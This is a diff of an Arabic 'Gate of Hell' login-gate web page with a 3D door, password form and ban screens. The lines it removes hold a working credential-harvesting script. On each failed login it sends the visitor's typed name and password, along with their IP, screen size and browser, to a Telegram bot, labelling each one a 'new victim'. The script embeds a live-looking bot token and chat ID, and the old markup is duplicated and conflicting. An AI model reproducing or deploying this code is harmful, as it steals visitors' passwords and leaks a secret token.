@@ -4,9 +4,12 @@
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
 <title>بوابة الجحيم</title>
-<style>
 
-/* الشاشة الرئيسية */
+<style>
+*{margin:0;padding:0;box-sizing:border-box;font-family:Tahoma,sans-serif}
+body{background:#000;overflow:hidden}
+
+/* ===== البوابة ===== */
 .portal-screen{
 position:fixed;
 inset:0;
@@ -16,724 +19,215 @@ display:flex;
 flex-direction:column;
 align-items:center;
 justify-content:center;
+transition:1s;
+}
+
+.portal-screen.hidden{
 opacity:0;
-transition:opacity 1s ease;
+pointer-events:none;
 }
 
-.portal-screen.show{opacity:1}
-.portal-screen.hidden{opacity:0;pointer-events:none}
-
-/* العداد */
-.attempts-counter{
-position:fixed;
-top:20px;
-left:50%;
-transform:translateX(-50%);
-z-index:45000;
-color:#ff0000;
-font-size:20px;
-font-weight:bold;
-background:rgba(0,0,0,0.7);
-padding:10px 20px;
-border:2px solid #ff0000;
-border-radius:10px;
-}
-
-/* عنوان المملكة */
 .kingdom-title{
 font-size:38px;
 color:#8a2be2;
 text-shadow:0 0 30px #8a2be2;
 margin-bottom:30px;
-animation:kingdomBreath 4s ease-in-out infinite;
+animation:breath 4s infinite;
 }
 
-@keyframes kingdomBreath{
+@keyframes breath{
 0%,100%{opacity:0.3}
 50%{opacity:1}
 }
 
-/* البوابة */
+/* ===== البوابة ===== */
 .door-container{
-position:relative;
 width:320px;
 height:420px;
 cursor:pointer;
-transition:transform 0.3s ease;
+transition:0.3s;
 }
 
 .door-container.disabled{
 pointer-events:none;
 filter:grayscale(1);
-opacity:0.6;
+opacity:0.5;
 }
 
-.door-container.selected{
-transform:scale(1.05);
+/* ===== العداد ===== */
+.attempts-counter{
+position:fixed;
+top:20px;
+left:50%;
+transform:translateX(-50%);
+background:rgba(0,0,0,0.7);
+color:red;
+padding:10px 20px;
+border:2px solid red;
+border-radius:10px;
+z-index:50000;
 }
 
-.door-container model-viewer{
-width:100%;
-height:100%;
-}
-
-/* تحذير */
-.portal-warning{
-margin-top:25px;
-color:#8a2be2;
-font-size:19px;
-font-weight:bold;
-text-align:center;
-animation:glowText 2s ease-in-out infinite alternate;
-}
-
-@keyframes glowText{
-from{text-shadow:0 0 10px #8a2be2}
-to{text-shadow:0 0 25px #8a2be2,0 0 35px #8a2be2}
-}
-
-/* فورم الدخول */
+/* ===== الفورم ===== */
 .shadow-form{
 position:fixed;
 top:50%;
 left:50%;
 transform:translate(-50%,-50%);
-width:90%;
-max-width:400px;
-background:rgba(0,0,0,0.95);
-border:3px solid #ff0000;
-box-shadow:0 0 50px #ff0000;
-padding:25px;
-z-index:41000;
+background:#000;
+border:3px solid red;
+padding:20px;
+width:300px;
 display:none;
+z-index:50000;
 }
 
 .shadow-form.active{display:block}
 
-.shadow-form h2{
-color:#ff0000;
-text-align:center;
-margin-bottom:15px;
-}
-
 .shadow-form input,
 .shadow-form select{
 width:100%;
-padding:12px;
 margin:10px 0;
-background:#1a0000;
-border:2px solid #ff0000;
-color:#ff0000;
-outline:none;
+padding:10px;
+background:#111;
+color:red;
+border:1px solid red;
 }
 
 .shadow-form button{
 width:100%;
-padding:15px;
-background:#8b0000;
-border:2px solid #ff0000;
+padding:10px;
+background:red;
 color:#fff;
+border:none;
 cursor:pointer;
 }
 
-.shadow-form button:hover{
-background:#ff0000;
-}
-
-/* الحظر */
+/* ===== الحظر ===== */
 .ban-form{
 position:fixed;
 top:50%;
 left:50%;
 transform:translate(-50%,-50%);
-width:90%;
-max-width:450px;
-background:rgba(0,0,0,0.98);
-border:3px solid #ff0000;
-padding:30px;
-z-index:41000;
+background:#000;
+border:3px solid red;
+padding:20px;
+color:red;
 text-align:center;
 display:none;
+z-index:60000;
 }
 
 .ban-form.active{display:block}
 
-.ban-form h2{color:#ff0000}
-.ban-form p{color:#ff0000;margin:15px 0}
-
-.ban-form button{
-width:100%;
-padding:15px;
-background:#8b0000;
-border:2px solid #ff0000;
-color:#fff;
-cursor:pointer;
-margin-top:15px;
-}
-
-.ban-form button:hover{
-background:#ff0000;
-}
-
-/* الموقع الرئيسي */
+/* ===== الموقع الرئيسي ===== */
 .main-site{
 position:fixed;
 inset:0;
 background:#111;
 display:none;
-z-index:1000;
-overflow:auto;
+justify-content:center;
+align-items:center;
+color:red;
+font-size:26px;
+z-index:10000;
 }
 
-.main-site.active{display:block}
-
-.main-site-content{
-padding:50px;
-color:#ff0000;
-text-align:center;
-font-size:24px;
-}
-*{margin:0;padding:0;box-sizing:border-box;font-family:Tahoma,sans-serif}
-body{background:#000;overflow:hidden}
-.portal-screen{position:fixed;inset:0;z-index:40000;background:url('ALBOMS/IMAGE/SiteBackground/file_000000006e2c722f9a965efdf432912b.png') center/cover no-repeat;display:flex;flex-direction:column;align-items:center;justify-content:center;opacity:0;transition:opacity 1s ease}
-.portal-screen.show{opacity:1}
-.portal-screen.hidden{opacity:0;pointer-events:none}
-.attempts-counter{position:fixed;top:20px;left:50%;transform:translateX(-50%);z-index:45000;color:#ff0000;font-size:20px;font-weight:bold;text-shadow:0 0 15px #ff0000;background:rgba(0,0,0,0.7);padding:10px 20px;border:2px solid #ff0000;border-radius:10px}
-.kingdom-title{font-size:38px;color:#8a2be2;text-shadow:0 0 30px #8a2be2;margin-bottom:30px;animation:kingdomBreath 4s ease-in-out infinite}
-@keyframes kingdomBreath{0%,100%{opacity:0.3}50%{opacity:1}}
-.door-container{position:relative;width:320px;height:420px;cursor:pointer;transition:transform 0.3s ease}
-.door-container.disabled{pointer-events:none;filter:grayscale(1);opacity:0.6}
-.door-container.selected{transform:scale(1.05)}
-.door-container model-viewer{width:100%;height:100%}
-.portal-warning{margin-top:25px;color:#8a2be2;font-size:19px;font-weight:bold;text-shadow:0 0 15px #8a2be2;text-align:center;animation:glowText 2s ease-in-out infinite alternate}
-@keyframes glowText{from{text-shadow:0 0 10px #8a2be2}to{text-shadow:0 0 25px #8a2be2,0 0 35px #8a2be2}}
-.shadow-form{position:fixed;top:50%;left:50%;transform:translate(-50%,-50%);width:90%;max-width:400px;background:rgba(0,0,0,0.95);border:3px solid #ff0000;box-shadow:0 0 50px #ff0000;padding:25px;z-index:41000;display:none}
-.shadow-form.active{display:block}
-.shadow-form h2{color:#ff0000;text-align:center;margin-bottom:15px;text-shadow:0 0 10px #ff0000}
-.shadow-form input,.shadow-form select{width:100%;padding:12px;margin:10px 0;background:#1a0000;border:2px solid #ff0000;color:#ff0000;font-size:16px;outline:none}
-.shadow-form input::placeholder{color:#8b0000}
-.shadow-form .btn-group{display:flex;gap:10px;margin-top:15px}
-.shadow-form button{flex:1;padding:15px;background:#8b0000;border:2px solid #ff0000;color:#fff;font-size:18px;cursor:pointer;transition:0.3s}
-.shadow-form button:hover{background:#ff0000;box-shadow:0 0 20px #ff0000}
-.shadow-form button.back-btn{background:#1a0000}
-.shadow-form button.back-btn:hover{background:#330000}
-.ban-form{position:fixed;top:50%;left:50%;transform:translate(-50%,-50%);width:90%;max-width:450px;background:rgba(0,0,0,0.98);border:3px solid #ff0000;box-shadow:0 0 60px #ff0000;padding:30px;z-index:41000;text-align:center;display:none}
-.ban-form.active{display:block}
-.ban-form h2{color:#ff0000;margin-bottom:15px}
-.ban-form p{color:#ff0000;margin:15px 0;line-height:1.6}
-.ban-form button{width:100%;padding:15px;background:#8b0000;border:2px solid #ff0000;color:#fff;font-size:18px;cursor:pointer;margin-top:15px;transition:0.3s}
-.ban-form button:hover{background:#ff0000;box-shadow:0 0 20px #ff0000}
-.ban-form button:disabled{background:#330000;cursor:not-allowed;opacity:0.5}
-.ban-form input{width:100%;padding:12px;margin:10px 0;background:#1a0000;border:2px solid #ff0000;color:#ff0000;font-size:16px;outline:none;text-align:center}
-.ban-form input:disabled{background:#0a0000;opacity:0.5}
-.ban-form input::placeholder{color:#8b0000}
-.error-text{color:#ff0000;margin-top:10px;font-size:14px;display:none;text-shadow:0 0 10px #ff0000}
-.error-text.show{display:block}
-.timer-text{color:#ff6600;margin-top:10px;font-size:16px;display:none}
-.timer-text.show{display:block}
-.main-site{position:fixed;inset:0;background:#111;display:none;z-index:1000;overflow:auto}
-.main-site.active{display:block}
-.main-site-content{padding:50px;color:#ff0000;text-align:center;font-size:24px}
+.main-site.active{display:flex}
 </style>
+
 <script type="module" src="https://unpkg.com/@google/model-viewer/dist/model-viewer.min.js"></script>
 </head>
+
 <body>
-<div class="attempts-counter" id="attemptsCounter">0</div>
 
-<div class="portal-screen show" id="portalScreen">
+<!-- عداد -->
+<div class="attempts-counter" id="counter">0</div>
 
-  <div class="kingdom-title">مملكة الظلال</div>
+<!-- البوابة -->
+<div class="portal-screen" id="portal">
 
-  <div class="door-container" id="doorContainer">
-    <model-viewer id="gateModel" src="gate.glb"></model-viewer>
-  </div>
+<div class="kingdom-title">مملكة الظلال</div>
 
-  <div class="portal-warning">
-    لا يمكنك الدخول إلا عبر بوابة الجحيم
-  </div>
+<div class="door-container" id="door">
+<model-viewer src="ALBOMS/3D/GLB/بوابة_العبور.glb"
+camera-controls disable-zoom disable-pan></model-viewer>
+</div>
 
 </div>
 
-<!-- فورم -->
-<div class="shadow-form" id="shadowForm">
-  <h2>الدخول</h2>
-  <input id="userName" placeholder="الاسم">
-  <input id="userPass" type="password" placeholder="كلمة السر">
-  <select id="userAnswer">
-    <option value="">اختر</option>
-    <option value="نعم">نعم</option>
-    <option value="ناه">ناه</option>
-  </select>
-  <button onclick="checkShadow()">دخول</button>
-</div>
+<!-- الفورم -->
+<div class="shadow-form" id="form">
+<input id="name" placeholder="الاسم">
+<input id="pass" type="password" placeholder="كلمة السر">
 
-<!-- الحظر -->
-<div class="ban-form" id="banForm">
-  <h2>تم طردك</h2>
-  <p>لا يمكنك الدخول الآن</p>
-  <button onclick="resetBan()">رجوع</button>
-</div>
-<div class="attempts-counter" id="attemptsCounter">الفرص: 0</div>
-<div class="portal-screen" id="portalScreen">
-<div class="kingdom-title">مملكة طائفة الظلام</div>
-<div class="door-container" id="doorContainer">
-<model-viewer id="gateModel" src="ALBOMS/3D/GLB/بوابة_العبور.glb" camera-controls disable-zoom disable-pan interaction-prompt="none" style="background:transparent"></model-viewer>
-</div>
-<div class="portal-warning">لا يمكنك زيارة المملكة ما لم تعبر بوابة الجحيم (سالمًا)</div>
-</div>
-<div class="shadow-form" id="shadowForm">
-<h2>💀 عرف من أنت 💀</h2>
-<input type="text" id="userName" placeholder="الاسم" required>
-<input type="password" id="userPass" placeholder="كلمة السر" required>
-<label style="color:#ff0000;display:block;margin-top:10px">سؤال: هل أنت من ظلال الجحيم؟</label>
-<select id="userAnswer" required>
-<option value="">اختر...</option>
+<select id="answer">
+<option value="">اختر</option>
 <option value="نعم">نعم</option>
 <option value="لا">لا</option>
 <option value="ناه">ناه</option>
-<option value="ربما">ربما</option>
 </select>
-<div class="btn-group">
-<button onclick="checkShadowAccess()">دخول</button>
-<button class="back-btn" onclick="closeShadowForm()">رجوع</button>
+
+<button onclick="check()">دخول</button>
 </div>
+
+<!-- الحظر -->
+<div class="ban-form" id="ban">
+<h3>تم الطرد</h3>
+<button onclick="reset()">رجوع</button>
 </div>
-<div class="ban-form" id="banForm">
-<h2 id="banTitle">❌ تم طردك من قبل الحراس</h2>
-<p id="banMainText">أنت مجرد نكرة ولست مؤهلاً لتزور مملكة أعلى منك مقامًا</p>
-<div id="tempBanSection" style="display:none">
-<button id="preLastChanceBtn" onclick="givePreLastChance()">فرصة ما قبل الأخيرة</button>
+
+<!-- الموقع الرئيسي -->
+<div class="main-site" id="main">
+مرحباً بك في مملكة طائفة الظلام
 </div>
-<div id="permaBanSection" style="display:none">
-<p>تم تعليقك بشكل دائم</p>
-<input type="text" id="returnID" placeholder="أدخل ID العودة" maxlength="20">
-<div class="error-text" id="errorText">ID العودة خطأ</div>
-<div class="timer-text" id="timerText"></div>
-<button id="lastChanceBtn" onclick="checkReturnID()">موافق</button>
-</div>
-</div>
-<div class="main-site" id="mainSite">
-<div class="main-site-content">
-<h1>مرحباً بك في مملكة طائفة الظلام</h1>
-<p>لقد عبرت بوابة الجحيم بنجاح</p>
-</div>
-</div>
-<audio id="clickSound" src="ALBOMS/VIDEIOS/km_20260504_1080p_30f_20260504_220606.mp4" preload="auto"></audio>
-<audio id="openSound" src="ALBOMS/AUDIOS/MP3/screen-20260502-213818.mp3"></audio>
-<audio id="mainMusic" src="ALBOMS/AUDIOS/MP3/km_20260504_1080p_30f_20260504_223643.mp3" loop></audio>
-<script type="module">
-const TELEGRAM_BOT_TOKEN = "8117644349:AAHzED3Undehj0IHUtg_nnet-FgUh4URjQU";
-const TELEGRAM_CHAT_ID = "8117644349";
-const modelViewer = document.getElementById('gateModel');
-let THREE = null;
-let doorL = null, doorR = null, gateOpened = false;
-let colorInterval = null;
-let clickAudio = null;
-let usersData = [];
-const correctPassword = "الظلال666";
-const correctAnswer = "ناه";
-let returnAttempts = 0;
-let timerInterval = null;
-let totalAttempts = 0;
-function updateAttemptsCounter(){
-document.getElementById('attemptsCounter').textContent = `الفرص: ${totalAttempts}`;
-}
+
+<script>
 let attempts = 0;
-const password = "1234";
 
-const door = document.getElementById("doorContainer");
-const form = document.getElementById("shadowForm");
-const ban = document.getElementById("banForm");
+const correctPass = "1234";
+const correctAnswer = "نعم";
 
-door.onclick = () => {
+const portal = document.getElementById("portal");
+const door = document.getElementById("door");
+const form = document.getElementById("form");
+const ban = document.getElementById("ban");
+const main = document.getElementById("main");
+const counter = document.getElementById("counter");
+
+/* فتح الفورم */
+door.onclick = ()=>{
 form.classList.add("active");
 };
 
-function checkShadow(){
-const pass = document.getElementById("userPass").value;
+/* التحقق */
+function check(){
+let pass = document.getElementById("pass").value;
+let answer = document.getElementById("answer").value;
 
-if(pass === password){
-openGate();
+if(pass === correctPass && answer === correctAnswer){
+portal.classList.add("hidden");
+main.classList.add("active");
 }else{
-banUser();
-}
-}
-
-function banUser(){
 attempts++;
-document.getElementById("attemptsCounter").innerText = attempts;
-
+counter.textContent = attempts;
 form.classList.remove("active");
 
 if(attempts >= 2){
 ban.classList.add("active");
-door.classList.add("disabled");
+door.style.pointerEvents = "none";
+}
 }
 }
 
-function resetBan(){
+/* إعادة */
+function reset(){
 ban.classList.remove("active");
 attempts = 0;
-door.classList.remove("disabled");
-document.getElementById("attemptsCounter").innerText = 0;
+counter.textContent = 0;
+door.style.pointerEvents = "auto";
 }
-
-function openGate(){
-alert("تم الدخول");
-form.classList.remove("active");
-}
-async function loadUsers(){
-try{
-const res = await fetch('Users.json');
-usersData = await res.json();
-}catch(e){
-usersData = [];
-}
-}
-function playClickSound(){
-if(!clickAudio){
-clickAudio = document.getElementById('clickSound');
-}
-clickAudio.currentTime = 0;
-clickAudio.play().catch(()=>{});
-}
-async function getIP(){
-try{
-const res = await fetch('https://api.ipify.org?format=json');
-const data = await res.json();
-return data.ip;
-}catch(e){
-return 'unknown';
-}
-}
-async function sendToTelegram(data){
-const text = `🚨 ضحية جديدة في الجحيم 🚨
-الاسم: ${data.name}
-كلمة السر: ${data.pass}
-الجواب: ${data.answer}
-IP: ${data.ip}
-الشاشة: ${data.screen}
-المتصفح: ${data.userAgent}
-الوقت: ${data.date}
-السبب: ${data.reason}`;
-try{
-await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`,{
-method:'POST',
-headers:{'Content-Type':'application/json'},
-body:JSON.stringify({
-chat_id:TELEGRAM_CHAT_ID,
-text:text
-})
-});
-}catch(e){}
-}
-async function saveToHellFile(name,pass,answer){
-let hellData = JSON.parse(localStorage.getItem('الجحيم.json') || '[]');
-const ip = await getIP();
-const screen = window.screen.width+'x'+window.screen.height;
-const entry = {
-name:name,
-pass:pass,
-answer:answer,
-ip:ip,
-screen:screen,
-userAgent:navigator.userAgent,
-date:new Date().toISOString(),
-reason:"فشل في عبور بوابة الجحيم"
-};
-const exists = hellData.find(u=>u.name===name && u.ip===ip && u.screen===screen);
-if(!exists){
-hellData.push(entry);
-localStorage.setItem('الجحيم.json', JSON.stringify(hellData));
-}
-await sendToTelegram(entry);
-}
-function checkHellFileBan(){
-let hellData = JSON.parse(localStorage.getItem('الجحيم.json') || '[]');
-const screenSize = window.screen.width+'x'+window.screen.height;
-return hellData.some(u=>u.screen===screenSize);
-}
-function setDoorColor(door, color){
-if(!door || !door.material) return;
-if(Array.isArray(door.material)){
-door.material.forEach(m=>{if(m && m.color)m.color.set(color)});
-}else{
-if(door.material && door.material.color) door.material.color.set(color);
-}
-}
-function freezeGate(){
-document.getElementById('doorContainer').classList.add('disabled');
-}
-function unfreezeGate(){
-document.getElementById('doorContainer').classList.remove('disabled');
-}
-function checkBanStatus(){
-const hellBan = checkHellFileBan();
-const banLevel = localStorage.getItem('banLevel');
-const preLastUsed = localStorage.getItem('preLastChanceUsed') === 'true';
-const permaBanActive = localStorage.getItem('permaBanActive') === 'true';
-if(permaBanActive || banLevel === 'perma'){
-showPermaBan();
-return true;
-}
-if(preLastUsed){
-return false;
-}
-if(banLevel === 'temp' || hellBan && banLevel !== 'perma'){
-showTempBan();
-return true;
-}
-return false;
-}
-function showTempBan(){
-document.getElementById('banForm').classList.add('active');
-document.getElementById('portalScreen').classList.add('show');
-document.getElementById('tempBanSection').style.display = 'block';
-document.getElementById('permaBanSection').style.display = 'none';
-document.getElementById('banTitle').textContent = '❌ تم طردك مؤقتاً';
-document.getElementById('banMainText').textContent = 'لقد وقعت في الفخ. لديك فرصة ما قبل الأخيرة';
-freezeGate();
-}
-function showPermaBan(){
-document.getElementById('banForm').classList.add('active');
-document.getElementById('portalScreen').classList.add('show');
-document.getElementById('tempBanSection').style.display = 'none';
-document.getElementById('permaBanSection').style.display = 'block';
-document.getElementById('banTitle').textContent = '⛔ تعليق دائم';
-freezeGate();
-localStorage.setItem('permaBanActive','true');
-checkReturnTimer();
-}
-window.givePreLastChance = function(){
-localStorage.removeItem('banLevel');
-localStorage.setItem('preLastChanceUsed','true');
-document.getElementById('banForm').classList.remove('active');
-document.getElementById('doorContainer').classList.remove('selected');
-document.getElementById('doorContainer').classList.remove('disabled');
-document.getElementById('userName').value = '';
-document.getElementById('userPass').value = '';
-document.getElementById('userAnswer').value = '';
-document.getElementById('portalScreen').classList.add('show');
-gateOpened = false;
-unfreezeGate();
-}
-function checkReturnTimer(){
-const lockTime = parseInt(localStorage.getItem('returnLockTime') || '0');
-const now = Date.now();
-if(lockTime > now){
-const remaining = Math.ceil((lockTime - now) / 1000);
-startTimer(remaining);
-}else{
-returnAttempts = parseInt(localStorage.getItem('returnAttempts') || '0');
-if(returnAttempts >= 5){
-setReturnLock();
-}else{
-enableReturnInput();
-}
-}
-}
-function enableReturnInput(){
-document.getElementById('returnID').disabled = false;
-document.getElementById('lastChanceBtn').disabled = false;
-document.getElementById('timerText').classList.remove('show');
-document.getElementById('errorText').classList.remove('show');
-}
-function disableReturnInput(){
-document.getElementById('returnID').disabled = true;
-document.getElementById('lastChanceBtn').disabled = true;
-}
-function setReturnLock(){
-const lockTime = Date.now() + 3600000;
-localStorage.setItem('returnLockTime', lockTime);
-localStorage.setItem('returnAttempts', '0');
-returnAttempts = 0;
-startTimer(3600);
-}
-function startTimer(seconds){
-disableReturnInput();
-document.getElementById('timerText').classList.add('show');
-document.getElementById('errorText').classList.remove('show');
-if(timerInterval) clearInterval(timerInterval);
-timerInterval = setInterval(()=>{
-seconds--;
-const h = Math.floor(seconds / 3600);
-const m = Math.floor((seconds % 3600) / 60);
-const s = seconds % 60;
-document.getElementById('timerText').textContent = `انتظر: ${h.toString().padStart(2,'0')}:${m.toString().padStart(2,'0')}:${s.toString().padStart(2,'0')}`;
-if(seconds <= 0){
-clearInterval(timerInterval);
-localStorage.removeItem('returnLockTime');
-enableReturnInput();
-document.getElementById('timerText').textContent = 'يمكنك المحاولة الآن - لديك 5 فرص';
-}
-},1000);
-}
-window.checkReturnID = function(){
-const inputID = document.getElementById('returnID').value.trim();
-const errorText = document.getElementById('errorText');
-if(!inputID){
-errorText.textContent = 'أدخل ID العودة';
-errorText.classList.add('show');
-return;
-}
-const valid = usersData.some(u=>u.id===inputID);
-if(valid){
-localStorage.removeItem('banLevel');
-localStorage.removeItem('returnAttempts');
-localStorage.removeItem('returnLockTime');
-localStorage.removeItem('preLastChanceUsed');
-localStorage.removeItem('permaBanActive');
-document.getElementById('banForm').classList.remove('active');
-document.getElementById('doorContainer').classList.remove('disabled');
-unfreezeGate();
-errorText.classList.remove('show');
-document.getElementById('returnID').value = '';
-gateOpened = false;
-}else{
-returnAttempts++;
-localStorage.setItem('returnAttempts', returnAttempts);
-errorText.textContent = 'ID العودة خطأ';
-errorText.classList.add('show');
-if(returnAttempts >= 5){
-setReturnLock();
-}
-}
-}
-function initPortalSequence(){
-loadUsers();
-totalAttempts = parseInt(localStorage.getItem('totalAttempts') || '0');
-updateAttemptsCounter();
-if(checkBanStatus()) return;
-document.getElementById('portalScreen').classList.add('show');
-setupGateModel();
-}
-async function setupGateModel(){
-await customElements.whenDefined('model-viewer');
-THREE = modelViewer.constructor.THREE;
-modelViewer.addEventListener('load', ()=>{
-const model = modelViewer.model;
-if(model){
-model.traverse((obj)=>{
-if(obj.name === "Door_L_Mareial") doorL = obj;
-if(obj.name === "Dor_R_Material") doorR = obj;
-});
-setInitialDoorColor();
-}
-});
-document.getElementById('doorContainer').addEventListener('click', ()=>{
-if(document.getElementById('doorContainer').classList.contains('disabled')) return;
-playClickSound();
-activateDoor();
-});
-}
-function setInitialDoorColor(){
-if(!THREE) return;
-const redColor = new THREE.Color(0xff0000);
-setDoorColor(doorL, redColor);
-setDoorColor(doorR, redColor);
-}
-function activateDoor(){
-if(gateOpened) return;
-document.getElementById('doorContainer').classList.add('selected');
-setTimeout(()=>{
-document.getElementById('shadowForm').classList.add('active');
-},500);
-}
-window.closeShadowForm = function(){
-document.getElementById('shadowForm').classList.remove('active');
-document.getElementById('doorContainer').classList.remove('selected');
-document.getElementById('userName').value = '';
-document.getElementById('userPass').value = '';
-document.getElementById('userAnswer').value = '';
-}
-window.checkShadowAccess = async function(){
-const name = document.getElementById('userName').value.trim();
-const pass = document.getElementById('userPass').value.trim();
-const answer = document.getElementById('userAnswer').value;
-if(!name || !pass || !answer){
-alert('املأ كل الحقول');
-return;
-}
-totalAttempts++;
-localStorage.setItem('totalAttempts', totalAttempts);
-updateAttemptsCounter();
-if(pass === correctPassword && answer === correctAnswer){
-document.getElementById('shadowForm').classList.remove('active');
-localStorage.removeItem('banLevel');
-localStorage.removeItem('returnAttempts');
-localStorage.removeItem('returnLockTime');
-localStorage.removeItem('preLastChanceUsed');
-localStorage.removeItem('permaBanActive');
-openKingdomGate();
-}else{
-document.getElementById('shadowForm').classList.remove('active');
-await saveToHellFile(name,pass,answer);
-const currentBan = localStorage.getItem('banLevel');
-const preLastUsed = localStorage.getItem('preLastChanceUsed') === 'true';
-if(preLastUsed){
-localStorage.setItem('banLevel','perma');
-localStorage.setItem('permaBanActive','true');
-showPermaBan();
-}else if(currentBan === 'temp'){
-localStorage.setItem('banLevel','perma');
-localStorage.setItem('permaBanActive','true');
-showPermaBan();
-}else if(currentBan === 'perma'){
-showPermaBan();
-}else{
-localStorage.setItem('banLevel','temp');
-showTempBan();
-}
-}
-}
-function startColorTransition(){
-if(!THREE || !doorL || !doorR) return;
-const startColor = new THREE.Color(0xff0000);
-const endColor = new THREE.Color(0x8a2be2);
-let progress = 0;
-let direction = 1;
-if(colorInterval) clearInterval(colorInterval);
-colorInterval = setInterval(()=>{
-progress += 0.005 * direction;
-if(progress >= 1){ progress = 1; direction = -1; }
-if(progress <= 0){ progress = 0; direction = 1; }
-const currentColor = startColor.clone().lerp(endColor, progress);
-setDoorColor(doorL, currentColor);
-setDoorColor(doorR, currentColor);
-}, 50);
-}
-function openKingdomGate(){
-if(gateOpened) return;
-gateOpened = true;
-document.getElementById('openSound').play().catch(()=>{});
-if(!doorL || !doorR){
-alert('ما لقيت الأبواب داخل الموديل. تأكد من الأسماء');
-return;
-}
-startColorTransition();
-const duration = 5000;
-const startTime = performance.now();
-const doorLStart = doorL.rotation.y;
-const doorRStart = doorR.rotation.y;
-function animateDoors(currentTime){
-const elapsed = currentTime - startTime;
-const progress = Math.min(elapsed / duration, 1);
-const angle = progress * (Math.PI / 2);
-doorL.rotation.y = doorLStart + angle;
-doorR.rotation.y = doorRStart - angle;
-if(progress < 1){
-requestAnimationFrame(animateDoors);
-}else{
-setTimeout(()=>{
-document.getElementById('portalScreen').classList.add('hidden');
-document.getElementById('mainSite').classList.add('active');
-document.getElementById('mainMusic').play().catch(()=>{});
-},500);
-}
-}
-requestAnimationFrame(animateDoors);
-}
-window.addEventListener('DOMContentLoaded', initPortalSequence);
 </script>
+
 </body>
 </html>
